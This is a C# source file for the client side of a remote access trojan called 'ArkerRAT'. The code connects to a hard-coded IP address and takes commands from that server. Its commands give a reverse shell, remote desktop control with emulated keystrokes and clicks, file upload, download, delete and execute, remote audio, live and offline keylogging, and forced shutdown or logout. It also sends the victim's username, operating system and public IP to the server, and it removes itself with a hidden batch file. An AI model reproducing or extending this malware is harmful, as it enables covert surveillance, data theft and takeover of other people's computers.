using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using ARKERRATCLIENT2._0;
using System.Runtime.CompilerServices;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO.Compression;


namespace ArkerRATClient
{
    public static class RATClientSession
    {
#if DEBUG
        private static int port = 2332;
        private static string ip = "78.72.90.139";
#else
        private static int port = 0;
        private static string ip ="";
#endif
        public static TcpClient tcpClient { get; set; }
        public static bool noConnection = true;
        public static bool isSendingData = false;
        private static NetworkStream serverStream { get; set; }

        public static async void ClientSession()
        {
            
            try
            {
                if (CheckIfDNS(ip))
                {
                    string dns= Dns.GetHostAddresses(ip)[0].ToString();
                    int index = dns.LastIndexOf('\\');
                    if(index != -1)
                    {
                        ip = dns.Substring(index);
                    }
                    else
                    {
                        ip = dns;
                    }
                }

                tcpClient = new TcpClient(ip, port);
                serverStream = tcpClient.GetStream();
                serverStream.ReadTimeout = 20000;
                noConnection = false;
                SendClientInfo();
                ReadData();
            }
            catch(Exception ex)
            {
                CloseConnection();
            }
        }

        private static bool CheckIfDNS(string ipOrDNS)
        {
            int dotCNT = 0;
            int numberCNT = 0;

            foreach (char chr in ipOrDNS)
            {
                if(chr== '.')
                {
                    dotCNT++;
                }
                else if (char.IsDigit(chr))
                {
                    numberCNT++;
                }
            }
            if(dotCNT >= 3 && numberCNT > 5)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        private static string SendIp()
        {
            try
            {
                string address = "";
                WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                {
                    address = stream.ReadToEnd();
                }

                int first = address.IndexOf("Address: ") + 9;
                int last = address.LastIndexOf("</body>");
                address = address.Substring(first, last - first);
                return address;
            }
            catch(Exception ex)
            {
                return "";
            }
          
        }
        public static async Task SendData(string textData)
        {
                try
                {
                    byte[] data = Encoding.UTF8.GetBytes(textData);
                    await serverStream.WriteAsync(data, 0, data.Length);
                    await serverStream.FlushAsync();
                }
                catch (Exception ex)
                {
                    CloseConnection();
                }
        }

        static string data = string.Empty;
        static private async void ReadData()
        {
                StringBuilder stringBuilder = new StringBuilder();
                try
                {
                    while (!noConnection)
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead = await serverStream.ReadAsync(buffer, 0, buffer.Length);

                        if (bytesRead > 0)
                        {
                            string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            stringBuilder.Append(receivedData);

                            lock (GlobalVariables._lock)
                            {
                                data += stringBuilder.ToString();
                            }

                        await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));

                        await Task.Run(() => SortData("§DisconnectStart§", "§DisconnectEnd§"));
                        await Task.Run(() => SortData("§UninstallStart§", "§UninstallEnd§"));
                        await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));

                        await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
                        await Task.Run(() => SortData("§ReconnectStart§", "§ReconnectEnd§"));
                        await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
                        await Task.Run(() => SortData("§RemoteAudioStart§", "§RemoteAudioEnd§"));
                        await Task.Run(() => SortData("§KeyLoggerStart§", "§KeyLoggerEnd§"));


                        await Task.Run(() => SortData("§ShutDownStart§", "§ShutDownEnd§"));
                        await Task.Run(() => SortData("§RestartStart§", "§RestartEnd§"));
                        await Task.Run(() => SortData("§LogOutStart§", "§LogOutEnd§"));
                        await Task.Run(() => SortData("§SleepStart§", "§SleepEnd§"));

                        stringBuilder.Clear();
                        }

                        await Task.Delay(1);
                    }
                }
                catch (Exception ex) { CloseConnection(); }
        }

        public static bool uninstallFix = false;
        private static async void SortData(string startDelimiter, string endDelimiter)
        {
            do
            {
                lock (GlobalVariables._lock)
                {
                    int startIndex = data.IndexOf(startDelimiter) + startDelimiter.Length;
                    int endIndex = data.IndexOf(endDelimiter) - 1;

                    if (startIndex != -1 && endIndex != -2 /*-2 because its always one less than the standard return -1 if you look at the squence abow*/&& startIndex <= endIndex+1)
                    {
                        string subString = string.Empty;

                        
                            subString = data.Substring(startIndex, endIndex - startIndex + 1);
                            data = data.Replace(startDelimiter + subString + endDelimiter, string.Empty);

                            //if (subString?.Length != null || subString?.Length != 0)
                            if (startDelimiter == "§ReverseShellStart§")
                        {
                            ReverseShell.ReverseCMDSession(subString);
                        }
                        else if (startDelimiter == "§DisconnectStart§")
                        {
                            CloseConnection();
                            Environment.Exit(0);
                        }
                        else if (startDelimiter == "§RemoteDesktopStart§")
                        {
                            if(subString.Length == 0&&!RemoteDesktop.sendingFrames)
                            {
                                RemoteDesktop.SendScreens();
                            }
                            else if (subString.Contains("§screen§"))
                            {
                                Task.Run(() => RemoteDesktop.StartScreenStreaming(50,subString.Replace("§screen§",string.Empty)));
                            }
                            else if (subString.Contains("§KI§"))
                            {
                              RemoteDesktop.EmulateKeyStrokes(subString.Replace("§KI§", string.Empty));
                            }
                            else if (subString.Contains("close")&&RemoteDesktop.sendingFrames)
                            {
                                RemoteDesktop.sendingFrames = false;
                            }
                            else if (subString.Contains("§ClickPositionStart§"))
                                RemoteDesktop.EmulateClick(subString);
                        }    
                        else if (startDelimiter=="§RemoteAudioStart§")
                        {
                            if(subString.Length == 0)
                            {
                                RemoteAudio.ApplySettings();
                                Task.Run(() => RemoteAudio.GetAndSendOutputDevices());
                                Task.Run(() => RemoteAudio.GetAndSendInputDevices());
                            }
                            else if (subString.Contains("§ODS§"))
                            {
                                subString = subString.Replace("§ODS§", string.Empty);
                                Task.Run(() => RemoteAudio.ChangeOutputDevice(subString));

                            }
                            else if (subString.Contains("§IDS§"))
                            {
                                subString = subString.Replace("§IDS§", string.Empty);

                                Task.Run(() => RemoteAudio.ChangeInputDevice(subString));
                            }
                            else if (subString == "close")
                            {
                                Task.Run(()=>RemoteAudio.StopRemoteAudio());
                            }

                        }
                        else if(startDelimiter == "§FileManagerStart§")
                        {
                            if (subString.Contains("§ND§"))
                            {
                                subString = subString.Replace("§ND§", string.Empty);
                                FileManager.CreateNewDirectory(subString);
                            }
                            else if (subString.Contains("§UF§"))
                            {
                                subString = subString.Replace("§UF§", string.Empty);

                                if(subString.Contains("§start§")&&!FileManager.download)
                                {
                                    subString = subString.Replace("§start§", string.Empty);
                                    Task.Run(()=> FileManager.StartDownloadingFile(subString));
                                }
                                else if (subString =="§end§")
                                {
                                    FileManager.download = false;
                                    FileManager.dataBuffer = new System.Collections.Concurrent.ConcurrentQueue<string>();
                                }
                                else
                                {
                                    FileManager.dataBuffer.Enqueue(subString);
                                }
                            }
                            else if (subString.Contains("§delete§"))
                            {
                                subString = subString.Replace("§delete§", string.Empty);
                                FileManager.DeleteObject(subString);
                            }
                            else if (subString.Contains("§DF§"))
                            {
                                subString = subString.Replace("§DF§", string.Empty);
                                FileManager.SendFileChunks(subString);
                            }
                            else if (subString.Contains("§exe§"))
                            {
                                subString = subString.Replace("§exe§", string.Empty);
                                FileManager.ExecuteFile(subString);

                            }
                            else if (subString =="close")
                            {
                                FileManager.CloseFileManager();
                            }
                            else
                            {
                                FileManager.SendFileSystem(subString);
                            }
                        }
                        else if(startDelimiter == "§KeyLoggerStart§")
                        {
                            if (subString.Contains("§OFK§")) {
                                subString = subString.Replace("§OFK§", string.Empty);

                                if (subString == "close")
                                {
                                    KeyLogger.CloseOfflineKeyLogger();
                                }
                                else if(subString=="start")
                                {
                                    KeyLogger.StartOfflineKeylogger();
                                }
                            }
                            else if(subString.Contains("§live§"))
                            {
                                subString = subString.Replace("§live§", string.Empty);
                                
                                if (subString == "close")
                                {
                                    KeyLogger.CloseLiveKeyLogger();
                                }
                                else if (subString == "start")
                                {
                                    KeyLogger.StartLiveKeyLogger();
                                }
                            }
                            else if (subString == "start")
                            {
                                KeyLogger.keyLoggingThread = Task.Run(() => KeyLogger.StartKeyLogger());
                            }
                            else if(subString=="close")
                            {
                                KeyLogger.StopKeyLogger();
                            }
                            
                        }
                        else if (startDelimiter == "§PingStart§")
                        {
                            SendData("§PingStart§§PingEnd§");
                        }
                        //this bool will make it so that the client doesn't try to reconnect at Program.cs while it is uninstalling.
                        else if (startDelimiter == "§UninstallStart§")
                        {
                            uninstallFix = true;
                            CloseConnection();

                            //DELETE EXE
                            string batchCommands = string.Empty;
                            string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

                            batchCommands += "@ECHO OFF\n";                         // Do not show any output
                            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
                            batchCommands += "echo j | del /F ";                    // Delete the executeable
                            batchCommands += AppDomain.CurrentDomain.FriendlyName + "\n";
                            batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file

                            File.WriteAllText("deleteMyProgram.bat", batchCommands);
                            ProcessStartInfo startInfo = new ProcessStartInfo("deleteMyProgram.bat");
                            startInfo.CreateNoWindow = true;
                            startInfo.UseShellExecute = false;
                            startInfo.FileName = "deleteMyProgram.bat";
                            Process.Start(startInfo);

                            File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + AppDomain.CurrentDomain.FriendlyName);

                            Environment.Exit(0);
                        }
                        else if (startDelimiter == "§ReconnectStart§")
                        {
                            CloseConnection();
                        }
                        else if (startDelimiter=="§ShutDownStart§")
                        {
                            ShutDown();
                        } 
                        else if (startDelimiter=="§RestartStart§")
                        {
                            Restart();
                        }
                        else if (startDelimiter=="§LogOutStart§")
                        {
                            LogOut();
                        } 
                        else if (startDelimiter=="§SleepStart§")
                        {
                            Sleep();
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                

                
            } while (true);
        }

        public static void CloseConnection()
        {
            try
            {
                RemoteAudio.StopRemoteAudio();
               
                tcpClient.Close();
                serverStream.Close();
            }
            catch(Exception ex)
            {
                noConnection = true;
            }
            noConnection = true;
        }

        public static async void SendClientInfo()
        {
             string HKLM_GetString(string path, string key)
             {
                try
                {
                    RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
                    if (rk == null) return "";
                    return (string)rk.GetValue(key);
                }
                catch { return ""; }
             }

             string FriendlyName()
             {
                string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
                string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
                if (ProductName != "")
                {
                    return (ProductName.StartsWith("Microsoft") ? "" : "Microsoft ") + ProductName +
                                (CSDVersion != "" ? " " + CSDVersion : "");
                }
                return "";
             }
            await SendData("§ClientInfoStart§"+"§ResulotionStart§" + Screen.PrimaryScreen.Bounds.Height + "," + Screen.PrimaryScreen.Bounds.Width + "§ResulotionEnd§" + Environment.UserName + "," + FriendlyName() + "," +SendIp()+"§ClientInfoEnd§");
        }

        private static void ShutDown()
        {
            Process.Start("shutdown", "/s /t 0");
        }

        private static void Restart()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        private static void LogOut()
        {
            Process.Start("shutdown", "/l");
        }

        private static void Sleep()
        {
            SetSuspendState(false, true, true);
        }

        // Import the necessary Windows API function for Sleep mode
        [System.Runtime.InteropServices.DllImport("PowrProf.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, ExactSpelling = true)]
        public static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);
    }

}

